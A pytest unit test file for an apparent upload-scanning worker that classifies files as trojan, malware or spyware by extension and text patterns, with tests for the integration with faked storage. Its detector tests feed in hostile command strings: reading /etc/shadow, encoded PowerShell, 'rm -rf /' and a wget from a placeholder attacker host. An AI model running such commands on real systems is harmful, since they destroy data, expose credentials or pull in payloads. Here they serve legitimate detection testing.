"""
Unit tests for worker.py's heuristic scanning logic.

These exercise the pure functions directly (_run_heuristics, _tally,
_scan_text_content) with no Redis or MinIO involved — importing `worker`
no longer touches the network at import time (storage is lazy now), so
these tests run in isolation, fast, with zero live infrastructure.
"""
import os

import worker


class TestTally:
    def test_empty_findings_all_zero(self):
        assert worker._tally([]) == {"trojan": 0, "malware": 0, "spyware": 0}

    def test_counts_by_category(self):
        findings = [
            {"category": "trojan", "detail": "a"},
            {"category": "trojan", "detail": "b"},
            {"category": "malware", "detail": "c"},
        ]
        counts = worker._tally(findings)
        assert counts == {"trojan": 2, "malware": 1, "spyware": 0}

    def test_ignores_unknown_categories(self):
        findings = [{"category": "unknown_thing", "detail": "x"}]
        counts = worker._tally(findings)
        assert counts == {"trojan": 0, "malware": 0, "spyware": 0}


class TestExtensionHeuristics:
    def test_trojan_extension_flagged(self, tmp_path):
        f = tmp_path / "payload.exe"
        f.write_text("irrelevant binary content")
        findings = worker._run_heuristics(".exe", str(f))
        categories = [x["category"] for x in findings]
        assert "trojan" in categories

    def test_spyware_extension_flagged(self, tmp_path):
        f = tmp_path / "script.ps1"
        f.write_text("Write-Host 'hello'")
        findings = worker._run_heuristics(".ps1", str(f))
        categories = [x["category"] for x in findings]
        assert "spyware" in categories

    def test_benign_extension_produces_no_extension_finding(self, tmp_path):
        f = tmp_path / "photo.jpg"
        f.write_bytes(b"\xff\xd8\xff\xe0fakejpegbytes")
        findings = worker._run_heuristics(".jpg", str(f))
        # .jpg is neither a forbidden extension nor text-scanned
        assert findings == []


class TestTextContentScanning:
    def test_clean_text_has_no_findings(self, tmp_path):
        f = tmp_path / "notes.txt"
        f.write_text("just some ordinary meeting notes")
        findings = worker._scan_text_content(str(f))
        assert findings == []

    def test_detects_malware_pattern(self, tmp_path):
        f = tmp_path / "script.py"
        f.write_text("result = eval(user_input)")
        findings = worker._scan_text_content(str(f))
        categories = [x["category"] for x in findings]
        assert "malware" in categories

    def test_detects_trojan_pattern(self, tmp_path):
        f = tmp_path / "run.sh"
        f.write_text("powershell -enc SGVsbG8gV29ybGQh")
        findings = worker._scan_text_content(str(f))
        categories = [x["category"] for x in findings]
        assert "trojan" in categories

    def test_detects_spyware_pattern(self, tmp_path):
        f = tmp_path / "run.sh"
        f.write_text("sudo cat /etc/shadow")
        findings = worker._scan_text_content(str(f))
        categories = [x["category"] for x in findings]
        assert "spyware" in categories

    def test_detects_multiple_patterns_in_one_file(self, tmp_path):
        f = tmp_path / "combo.py"
        f.write_text("eval(x); sudo rm -rf /; wget http://evil.example/payload")
        findings = worker._scan_text_content(str(f))
        # eval( -> malware, sudo -> spyware, rm -rf -> malware, wget http -> malware
        categories = [x["category"] for x in findings]
        assert "malware" in categories
        assert "spyware" in categories
        assert len(findings) >= 3

    def test_unreadable_file_flagged_for_review(self, tmp_path):
        missing = tmp_path / "does_not_exist.txt"
        findings = worker._scan_text_content(str(missing))
        assert len(findings) == 1
        assert findings[0]["category"] == "spyware"
        assert "unreadable" in findings[0]["detail"].lower()

    def test_scan_is_case_insensitive(self, tmp_path):
        f = tmp_path / "script.py"
        f.write_text("EVAL(something)")
        findings = worker._scan_text_content(str(f))
        categories = [x["category"] for x in findings]
        assert "malware" in categories


class FakeBlobStorage:
    """Stands in for a real object store in tests. `contents` maps a
    storage key to the bytes/text that would have been uploaded there —
    download() writes that content to whatever scratch path scan_file
    requests, mirroring what a real MinIO/Blob download would do."""

    def __init__(self, contents: dict[str, str]):
        self.contents = contents
        self.deleted_keys = []

    def download(self, key, local_path):
        with open(local_path, "w") as f:
            f.write(self.contents[key])

    def get_url(self, key):
        return f"http://fake/{key}"

    def delete(self, key):
        self.deleted_keys.append(key)


class TestScanFileIntegration:
    """Exercises the full scan_file() orchestration with storage, jobstate,
    and metrics all faked out — verifies the wiring, not the infra."""

    def test_clean_file_produces_success_status(self, monkeypatch):
        recorded_updates = []
        monkeypatch.setattr(worker, "update_job", lambda job_id, **fields: recorded_updates.append(fields))

        fake_storage = FakeBlobStorage({"job-1.txt": "nothing suspicious here"})
        monkeypatch.setattr(worker, "_get_storage_client", lambda: fake_storage)
        monkeypatch.setattr(worker.metrics, "incr", lambda *a, **k: None)
        monkeypatch.setattr(worker.time, "sleep", lambda *_: None)  # skip the artificial delay

        worker.scan_file("job-1", "job-1.txt", ".txt", "text/plain", "clean.txt")

        final = recorded_updates[-1]
        assert final["status"] == "success"
        assert final["verdict"] == "clean"
        assert final["findings"] == []

    def test_malicious_file_produces_quarantined_verdict(self, monkeypatch):
        recorded_updates = []
        monkeypatch.setattr(worker, "update_job", lambda job_id, **fields: recorded_updates.append(fields))

        fake_storage = FakeBlobStorage({"job-2.py": "eval(payload)"})
        monkeypatch.setattr(worker, "_get_storage_client", lambda: fake_storage)
        monkeypatch.setattr(worker.metrics, "incr", lambda *a, **k: None)
        monkeypatch.setattr(worker.time, "sleep", lambda *_: None)

        worker.scan_file("job-2", "job-2.py", ".py", "text/x-python", "bad.py")

        final = recorded_updates[-1]
        assert final["status"] == "success"
        assert final["verdict"] == "quarantined"
        assert len(final["findings"]) >= 1

    def test_storage_key_deleted_after_scan(self, monkeypatch):
        """Regression test: the API-uploaded blob must not survive the
        scan — this is the compliance-footer claim made literally true."""
        monkeypatch.setattr(worker, "update_job", lambda *a, **k: None)
        fake_storage = FakeBlobStorage({"job-3.txt": "hello"})
        monkeypatch.setattr(worker, "_get_storage_client", lambda: fake_storage)
        monkeypatch.setattr(worker.metrics, "incr", lambda *a, **k: None)
        monkeypatch.setattr(worker.time, "sleep", lambda *_: None)

        worker.scan_file("job-3", "job-3.txt", ".txt", "text/plain", "temp.txt")

        assert "job-3.txt" in fake_storage.deleted_keys

    def test_local_scratch_copy_deleted_after_scan(self, monkeypatch):
        """Regression test: the worker's OWN downloaded scratch copy must
        not survive the scan either — the disk-cleanup fix applies to
        both the blob and the worker's private temp file."""
        monkeypatch.setattr(worker, "update_job", lambda *a, **k: None)
        fake_storage = FakeBlobStorage({"job-5.txt": "hello"})
        monkeypatch.setattr(worker, "_get_storage_client", lambda: fake_storage)
        monkeypatch.setattr(worker.metrics, "incr", lambda *a, **k: None)
        monkeypatch.setattr(worker.time, "sleep", lambda *_: None)

        worker.scan_file("job-5", "job-5.txt", ".txt", "text/plain", "temp.txt")

        assert not os.path.exists(f"{worker.SCRATCH_DIR}/job-5.txt")

    def test_exception_during_scan_sets_error_status(self, monkeypatch):
        recorded_updates = []
        monkeypatch.setattr(worker, "update_job", lambda job_id, **fields: recorded_updates.append(fields))
        monkeypatch.setattr(worker.metrics, "incr", lambda *a, **k: None)
        monkeypatch.setattr(worker.time, "sleep", lambda *_: None)

        def broken_storage_client():
            raise ConnectionError("storage unreachable")
        monkeypatch.setattr(worker, "_get_storage_client", broken_storage_client)

        worker.scan_file("job-4", "job-4.txt", ".txt", "text/plain", "ok.txt")

        final = recorded_updates[-1]
        assert final["status"] == "error"
        assert final["verdict"] == "error"
